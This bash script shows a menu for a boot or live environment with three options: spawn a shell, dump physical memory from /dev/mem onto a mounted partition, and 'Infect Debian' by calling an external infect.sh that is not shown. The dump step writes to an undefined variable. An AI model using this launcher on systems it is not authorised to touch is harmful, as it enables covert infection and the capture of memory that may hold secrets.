#! /bin/bash


## Display the menu


function display_menu 
{
    echo "" 
    echo "-- Select what you want to do:"
    echo "   1) Run a bash"
    echo "   2) Dump memory"
    echo "   3) Infect Debian"
}


function run_bash
{
    /bin/bash
    exit 0
}


function dump_memory
{
    data_name="/dev/sda2"
    data_target="/mnt/data"
    echo "Mounting $data_name to $data_target  .."
    mount $data_name $data_target
    dd if="/dev/mem" of="$target/mem_dump"
}

function infect_debian
{
    echo "Launching infection .."
    /usr/bin/debian_infection/infect.sh
}


display_menu

while read LINE; do
    case "$LINE" in
        "1")
            echo "You've selected to run a bash"
            run_bash
            ;;
        "2")
            dump_memory
            display_menu
            ;;
        "3")
            infect_debian
            display_menu
            ;;
        *)
            echo "Wrong option"
            display_menu
            ;;
    esac
done


exit 0



